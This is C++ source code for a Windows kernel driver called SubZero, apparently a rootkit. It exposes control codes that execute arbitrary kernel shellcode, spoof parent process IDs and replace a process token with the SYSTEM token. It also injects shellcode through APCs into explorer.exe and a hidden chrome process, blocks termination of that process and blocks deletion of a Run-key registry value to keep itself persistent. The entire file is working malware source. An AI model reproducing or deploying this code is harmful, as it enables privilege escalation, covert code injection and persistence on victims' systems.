#include "pch.h"
#include "SubZero.h"

extern "C" NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) 
{
	KdPrint((DRIVER_PREFIX "[+] Driver was loaded\n"));

	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"12345.6171");
	
	// Build registration structures for chrome Process' protection
	OB_OPERATION_REGISTRATION operations[] = 
	{
		{
			PsProcessType,		        // object type
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenProcess, nullptr	// pre, post
		}
	};
	OB_CALLBACK_REGISTRATION reg = 
	{
		OB_FLT_REGISTRATION_VERSION,
		1,                  // operation count
		altitude,			// altitude
		nullptr,			// context
		operations
	};

	auto status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = nullptr;
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\" DRIVER_NAME);
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\" DRIVER_NAME);
	bool symLinkCreated = false;

	do {
		status = ::IoCreateDevice(DriverObject, 0, &devName,
			FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
		if (!NT_SUCCESS(status)) 
		{
			KdPrint((DRIVER_PREFIX "[-] Failed to create device (status=0x%08X)\n",status));
			break;
		}
		DeviceObject->Flags |= DO_DIRECT_IO;

		status = ::IoCreateSymbolicLink(&symLink, &devName);
		if (!NT_SUCCESS(status)) 
		{
			KdPrint((DRIVER_PREFIX "[-] Failed to create sym link (status=0x%08X)\n",status));
			break;
		}
		symLinkCreated = true;

		// Register for object notifications
		status = ::ObRegisterCallbacks(&reg, &g_Globals.ObjectRegistrationHandle);
		if (!NT_SUCCESS(status)) 
		{
			KdPrint((DRIVER_PREFIX "[-] Failed to register object callbacks (status=0x%08X)\n", status));
			break;
		}

		status = ::CmRegisterCallbackEx(OnRegistryNotify, &altitude, DriverObject,
			nullptr, &g_Globals.RegistryRegistrationCookie, nullptr);
		if (!NT_SUCCESS(status)) 
		{
			KdPrint((DRIVER_PREFIX "failed to set registry callback (status=%08X)\n", status));
			break;
		}

		// Register for Thread notifications
		status = ::PsSetCreateThreadNotifyRoutine(OnThreadNotify);
		if (!NT_SUCCESS(status)) 
		{
			KdPrint((DRIVER_PREFIX "[-] Failed to set Thread callbacks (status=%08X)\n", status));
			break;
		}
		
	} while (false);
	
	if (!NT_SUCCESS(status)) 
	{
		if (symLinkCreated)
			::IoDeleteSymbolicLink(&symLink);
		if (nullptr != DeviceObject)
			::IoDeleteDevice(DeviceObject);

		// Unregister notifications (sending a non-present function is allowed and will not crash the system)
		::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);		
		::ObUnRegisterCallbacks(g_Globals.ObjectRegistrationHandle);
		::CmUnRegisterCallback(g_Globals.RegistryRegistrationCookie);
	}

	// Initialize RundownProtection for APCs
	::ExInitializeRundownProtection(&g_Globals.RundownProtection);

	// Search for explorer Process
	PEPROCESS explorerProcess;
	LARGE_INTEGER interval;
	interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
	do {
		if (NT_SUCCESS(FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess))) 
		{
			g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
			KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
			break;
		}
		KdPrint((DRIVER_PREFIX "[-] explorer.exe not found. Trying again in 5 seconds\n"));
		::KeDelayExecutionThread(KernelMode, false, &interval); 
	} while (true);

	DriverObject->DriverUnload = SubZeroUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = SubZeroCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SubZeroCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = SubZeroDeviceControl;
	
	return status;
}

void SubZeroUnload(PDRIVER_OBJECT DriverObject)
{	
	// Unregister Process & Thread notifications in case of an APC error
	::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
	::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);

	// Unregister object & registry notifications
	::ObUnRegisterCallbacks(g_Globals.ObjectRegistrationHandle);
	::CmUnRegisterCallback(g_Globals.RegistryRegistrationCookie);

	// Wait for KAPC to finish in case of an error
	::ExWaitForRundownProtectionRelease(&g_Globals.RundownProtection);

	// Delete device
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\" DRIVER_NAME);
	::IoDeleteSymbolicLink(&symLink);
	::IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint((DRIVER_PREFIX "[+] Driver unloaded successfully\n"));
}

NTSTATUS SubZeroCreateClose(PDEVICE_OBJECT, PIRP Irp) 
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	::IoCompleteRequest(Irp, 0);
	return STATUS_SUCCESS;
}

NTSTATUS SubZeroDeviceControl(PDEVICE_OBJECT, PIRP Irp)
{
	auto* const stack = IoGetCurrentIrpStackLocation(Irp);
	auto const controlCode = stack->Parameters.DeviceIoControl.IoControlCode;
	NTSTATUS status = STATUS_NOT_SUPPORTED;

	// Can be changed per control code. Default is 0
	Irp->IoStatus.Information = 0;

	if (nullptr != Irp)
	{
		// Run the corresponding handler for the request:
		switch (controlCode) 
		{
		case IOCTL_SUBZERO_EXECUTE_SHELLCODE:
			status = ExecuteShellcode_ControlCodeHandler(Irp, stack);
			break;

		case IOCTL_SUBZERO_SET_PPID:
			status = SetParentPID_ControlCodeHandler(Irp, stack);
			break;

		case IOCTL_SUBZERO_SET_TOKEN_TO_SYSTEM:
			status = SetTokenToSystem_ControlCodeHandler(Irp, stack);
			break;

		default:
			status = STATUS_INVALID_DEVICE_REQUEST;
			break;
		}
	}

	// Complete request
	Irp->IoStatus.Status = status;
	::IoCompleteRequest(Irp, 0);
	return status;
}

NTSTATUS ExecuteShellcode_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation)
{
	KdPrint((DRIVER_PREFIX "[+] ExecuteShellcode handler invoked\n"));

	if (sizeof(SubZeroExecuteShellcodeData) > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
		return STATUS_BUFFER_TOO_SMALL;

	__try
	{
		auto* buffer = static_cast<SubZeroExecuteShellcodeData*>(Irp->AssociatedIrp.SystemBuffer);
		if (sizeof(SubZeroExecuteShellcodeData) + buffer->ShellcodeSize > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
			return STATUS_BUFFER_TOO_SMALL;
				
		auto* const returnedDataAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ReturnedDataMaxSize, DRIVER_TAG);
		if (nullptr == returnedDataAddress) 
		{
			KdPrint((DRIVER_PREFIX "[-] Error allocating returned data space\n"));
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		KernelPisParameters pisParameters;
		pisParameters.MmGetSystemRoutineAddress = MmGetSystemRoutineAddress;
		pisParameters.ReturnedDataAddress = returnedDataAddress;
		pisParameters.ReturnedDataMaxSize = buffer->ReturnedDataMaxSize;
		
		auto* const pisAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ShellcodeSize, DRIVER_TAG);
		if (nullptr == pisAddress) 
		{
			KdPrint((DRIVER_PREFIX "[-] Error allocating PIS space\n"));
			return STATUS_INSUFFICIENT_RESOURCES;
		}
		
		::RtlCopyMemory(pisAddress, reinterpret_cast<PCHAR>(buffer) + buffer->ShellcodeOffset, buffer->ShellcodeSize);

		auto const pic = static_cast<KernelPisFunction>(pisAddress);

		HANDLE threadHandle;
		auto status = ::PsCreateSystemThread(
			&threadHandle, 
			THREAD_ALL_ACCESS, 
			nullptr, 
			nullptr, 
			nullptr,
			pic, 
			&pisParameters);
		if (!NT_SUCCESS(status))
			return status;

		PVOID threadObject;
		status = ::ObReferenceObjectByHandle(
			threadHandle,
			THREAD_ALL_ACCESS,
			nullptr,
			KernelMode,
			&threadObject,
			nullptr);
		if (!NT_SUCCESS(status))
			return status;
		
		status = ::KeWaitForSingleObject(
			threadObject,
			Executive,
			KernelMode,
			FALSE,
			nullptr);
		if (!NT_SUCCESS(status))
			return status;

		// Copy returned data to user buffer
		::RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, pisParameters.ReturnedDataAddress, buffer->ReturnedDataMaxSize);

		// Set returned data buffer size
		Irp->IoStatus.Information = pisParameters.ReturnedDataMaxSize;

		// Free PIS memory
		::ExFreePoolWithTag(returnedDataAddress, DRIVER_TAG);
		::ExFreePoolWithTag(pisAddress, DRIVER_TAG);

		return STATUS_SUCCESS;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_INTERNAL_ERROR;
	}		
}

NTSTATUS SetParentPID_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation)
{
	KdPrint((DRIVER_PREFIX "[+] SetParentPID handler invoked\n"));

	if (sizeof(SubZeroChangePPIDData) > StackLocation->Parameters.DeviceIoControl.InputBufferLength) 
		return STATUS_BUFFER_TOO_SMALL;		
	
	__try
	{
		auto* buffer = static_cast<SubZeroChangePPIDData*>(Irp->AssociatedIrp.SystemBuffer);
		auto* const processHandle = ::ULongToHandle(buffer->ProcessID);
		if (nullptr == processHandle) 
			return STATUS_INVALID_PARAMETER;

		if (nullptr == ::ULongToHandle(buffer->NewParentID)) 
			return STATUS_INVALID_PARAMETER;

		PEPROCESS process;
		const auto status = ::PsLookupProcessByProcessId(processHandle, &process);
		if (!NT_SUCCESS(status))
			return status;

		// Change PPID value
		::InterlockedExchange(reinterpret_cast<volatile LONG*>(reinterpret_cast<uintptr_t>(process) + EPROCESS_PARENT_PID), buffer->NewParentID);
		
		return STATUS_SUCCESS;		
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_INTERNAL_ERROR;
	}
}

NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation)
{
	KdPrint((DRIVER_PREFIX "[+] SetTokenToSystem handler invoked\n"));

	if (sizeof(SubZeroSetTokenToSystemData) > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
		return STATUS_BUFFER_TOO_SMALL;		
	
	__try
	{
		auto* pid = static_cast<SubZeroSetTokenToSystemData*>(Irp->AssociatedIrp.SystemBuffer);
		auto* const processHandle = ::ULongToHandle(*pid);
		if (nullptr == processHandle) 
			return STATUS_INVALID_PARAMETER;
		
		PEPROCESS process;
		auto status = ::PsLookupProcessByProcessId(processHandle, &process);
		if (!NT_SUCCESS(status))
			return status;
		
		auto* const token = ::PsReferencePrimaryToken(process); // Get the process token										
		status = SetTokenToSystem(process, token);              // Replace the process token with system token		
		::ObDereferenceObject(token);                           // Dereference the process token

		return status;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_INTERNAL_ERROR;
	}
}

NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) 
{
	REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo = nullptr;
	PCUNICODE_STRING name = nullptr;

	switch (static_cast<REG_NOTIFY_CLASS>(reinterpret_cast<ULONG_PTR>(Argument1)))
	{
	case RegNtPreDeleteValueKey:

		deleteValueInfo = static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(Argument2);
		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
			
			// filter out key deletions
			if (0 == ::wcsncmp(name->Buffer, REG_MACHINE REG_RUN_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_RUN_KEY_PATH) - 1)) {

				// filter out value deletions
				if (0 == ::wcsncmp(deleteValueInfo->ValueName->Buffer, REG_VALUE_NAME, ARRAYSIZE(REG_VALUE_NAME) - 1)) {
					KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
					return STATUS_ACCESS_DENIED;
				}			
			}
		}
	}

	// No match found
	return STATUS_SUCCESS;
}

OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID, POB_PRE_OPERATION_INFORMATION Info) 
{
	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	auto* const process = static_cast<PEPROCESS>(Info->Object);
	auto const pid = ::HandleToULong(::PsGetProcessId(process));
	
	if (pid == g_Globals.ChromePID) 
	{
		//  Remove terminate access
		Info->Parameters->CreateHandleInformation.DesiredAccess &=
			~PROCESS_TERMINATE;
	}
	return OB_PREOP_SUCCESS;
}

void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
{
	// Thread creation only
	if (!Create) 
		return;

	PETHREAD thread;
	const auto pid = ::HandleToULong(ProcessId);
	const auto tid = ::HandleToULong(ThreadId);

	// Search for an explorer Thread
	if (pid == g_Globals.ExplorerPID) 
	{
		// Check if a launcher Thread was already found
		if (g_Globals.ExplorerLauncherThreadID != 0) 
			return;

		KdPrint((DRIVER_PREFIX "[+] explorer launcher Thread caught. TID: %d\n", tid));
		g_Globals.ExplorerLauncherThreadID = tid;

		// Register for Process notifications in order to catch the ghost chrome launch
		const auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
		if (!NT_SUCCESS(status)) 
		{
			KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", status));
			return;
		}

		// Queue APC for chrome creation
		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) 
		{
			::PsLookupThreadByThreadId(ThreadId, &thread);
			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) { InjectUsermodeShellcodeAPC(LaunchChromeShellcode, ARRAYSIZE(LaunchChromeShellcode)); })))
				::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		}
		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
	}
	// Search for chrome's first Thread
	else if (pid == g_Globals.ChromePID)
	{
		// Check if the first Thread was already found
		if (g_Globals.ChromeFirstThreadID != 0) 
			return;

		KdPrint((DRIVER_PREFIX "[+] Chrome first Thread caught. TID: %d\n", tid));
		g_Globals.ChromeFirstThreadID = tid;

		// Queue APC for dll loading
		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) 
		{
			::PsLookupThreadByThreadId(ThreadId, &thread);
			
			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)		
				{				
					auto* const process = ::PsGetCurrentProcess();          // Get current process (i.e. chrome.exe)
					auto* const token = ::PsReferencePrimaryToken(process); // Get the process token
					SetTokenToSystem(process, token);                       // Replace the process token with system token
					::ObDereferenceObject(token);                           // Dereference the process token
					
					// Thread and Process creation notification callbacks are not needed anymore
					::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
					::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);

					// Now inject the shellcode
					InjectUsermodeShellcodeAPC(LoadLibraryShellcode, ARRAYSIZE(LoadLibraryShellcode));
			})))
				::ExReleaseRundownProtection(&g_Globals.RundownProtection);			
		}
		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
	}
}

void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	// Process creation only
	if (!CreateInfo) 
		return;

	auto pid = ::HandleToULong(ProcessId);
	if (g_Globals.ChromePID == 0) 
	{
		// Search for our ghost chrome 
		if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) 
		{
			KdPrint((DRIVER_PREFIX "[+] Chrome.exe caught. PID: %d\n", pid));
			g_Globals.ChromePID = pid;
		}
	}
}

NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunction) 
{
	auto* apc = static_cast<KAPC*>(::ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG));
	if (nullptr == apc) 
	{
		KdPrint((DRIVER_PREFIX "[-] Error allocating KAPC structure\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	::KeInitializeApc(
		apc,
		Thread,
		OriginalApcEnvironment,
		[](PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*) {::ExFreePoolWithTag(apc, DRIVER_TAG); }, // Kernel APC
		[](const PKAPC apc)	                                                                               // Rundown APC
		{
			::ExFreePoolWithTag(apc, DRIVER_TAG);
			::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		}, 
		ApcFunction,                                                                                       // Normal APC
		Mode,
		nullptr
	);

	auto const inserted = ::KeInsertQueueApc(
		apc,
		nullptr,
		nullptr,
		0
	);

	if (!inserted) 
	{
		::ExFreePoolWithTag(apc, DRIVER_TAG);
		KdPrint((DRIVER_PREFIX "[-] Error inserting APC\n"));
		return STATUS_INTERNAL_ERROR;
	}

	KdPrint((DRIVER_PREFIX "[+] APC queued successfully\n")); 
	return STATUS_SUCCESS;
}

void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) 
{
	KdPrint((DRIVER_PREFIX "[+] InjectUsermodeShellcodeAPC invoked\n"));

	SIZE_T pageAlligndShellcodeSize = ShellcodeSize;
	auto* const hProcess = ZwCurrentProcess();

	// Allocate Shellcode's memory
	void* address{};
	auto status = ::ZwAllocateVirtualMemory(
		hProcess,
		&address,
		0,
		&pageAlligndShellcodeSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READ
	);
	if (!NT_SUCCESS(status)) 
	{
		KdPrint((DRIVER_PREFIX "[-] ZwAllocateVirtualMemory failed (0x%08X)\n", status));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}

	PMDL mdl;
	PVOID mappedAddress = nullptr;
	bool successful = false;
	do
	{
		// Allocate MDL
		mdl = ::IoAllocateMdl(
			address,
			static_cast<ULONG>(pageAlligndShellcodeSize),
			false,
			false,
			nullptr
		);
		if (!mdl) 
			break;

		::MmProbeAndLockPages(
			mdl,
			KernelMode,
			IoReadAccess
		);

		// Lock to kernel memory
		mappedAddress = ::MmMapLockedPagesSpecifyCache(
			mdl,
			KernelMode,
			MmNonCached,
			nullptr,
			false,
			NormalPagePriority
		);
		if (!mappedAddress) 
			break;

		// Change protection
		status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
		if (NT_SUCCESS(status))
			successful = true;

	} while (false);

	if (!successful) 
	{
		if (mdl) 
		{
			if (mappedAddress) 
			{
				KdPrint((DRIVER_PREFIX "[-] Error protecting MDL pages\n"));
				::MmUnmapLockedPages(mappedAddress, mdl);
			}
			else KdPrint((DRIVER_PREFIX "[-] Error mapping MDL\n"));
			::MmUnlockPages(mdl);
			::IoFreeMdl(mdl);
		}
		else KdPrint((DRIVER_PREFIX "[-] Error allocating MDL\n"));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}

	// Copy Shellcode
	__try
	{
		::RtlCopyMemory(mappedAddress, Shellcode, ShellcodeSize);
		KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)ShellcodeSize));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p)\n", mappedAddress));
	}
	

	// Free MDL pages
	::MmUnmapLockedPages(mappedAddress, mdl);
	::MmUnlockPages(mdl);
	::IoFreeMdl(mdl);

	QueueAPC(::KeGetCurrentThread(), UserMode, static_cast<PKNORMAL_ROUTINE>(address));

	// Kernel APC finished - release RP
	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
}

NTSTATUS FindProcessByName(PCHAR ProcessName, PEPROCESS* Process)
{
	auto* const initialSystemProcess = PsInitialSystemProcess;
	auto* currentEntry = initialSystemProcess;

	CHAR imageName[30];

	__try
	{
		// Loop on system's process list
		do
		{
			// Compare process name		
			::RtlCopyMemory(static_cast<PVOID>(&imageName), reinterpret_cast<PVOID>(reinterpret_cast<uintptr_t>(currentEntry) + EPROCESS_IMAGE_FILE_NAME), ARRAYSIZE(imageName));
			if (::strstr(imageName, ProcessName))
			{
				// Check if the process has active threads
				ULONG activeThreads = 0;
				::RtlCopyMemory(static_cast<PVOID>(&activeThreads), reinterpret_cast<PVOID>(reinterpret_cast<uintptr_t>(currentEntry) + EPROCESS_ACTIVE_THREADS), sizeof(activeThreads));
				if (0 != activeThreads)
				{
					*Process = currentEntry;
					return STATUS_SUCCESS;
				}
			}

			// Iterate to the next process
			auto* list = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<uintptr_t>(currentEntry) + EPROCESS_ACTIVE_PROCESS_LIST);
			currentEntry = reinterpret_cast<PEPROCESS>(reinterpret_cast<uintptr_t>(list->Flink) - EPROCESS_ACTIVE_PROCESS_LIST);  // Same as CONTAINING_RECORD macro

		} while (currentEntry != initialSystemProcess);

		return STATUS_NOT_FOUND;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "[-] Exception raised in FindProcessByName() \n"));
		return STATUS_INTERNAL_ERROR;
	}	
}

NTSTATUS SetTokenToSystem(PEPROCESS Process, PACCESS_TOKEN Token)
{
	NTSTATUS status = STATUS_NOT_FOUND;

	auto systemToken = ::PsReferencePrimaryToken(PsInitialSystemProcess);
	auto* const processPointer = reinterpret_cast<PULONG_PTR>(Process);

	for (ULONG i = 0; i < 512; i++)
	{
		// Locate the Token member in the EPROCESS structure (without RefCount)
		if ((processPointer[i] & ~7) == (reinterpret_cast<ULONG_PTR>(Token) & ~7))
		{
			// Replace the original token with system token
			processPointer[i] = reinterpret_cast<ULONG_PTR>(systemToken);
			KdPrint((DRIVER_PREFIX "[+] Process token has changed successfully\n"));
			status = STATUS_SUCCESS;
			break;
		}
	}
	// Dereference the system token
	::ObDereferenceObject(systemToken);

	return status;
}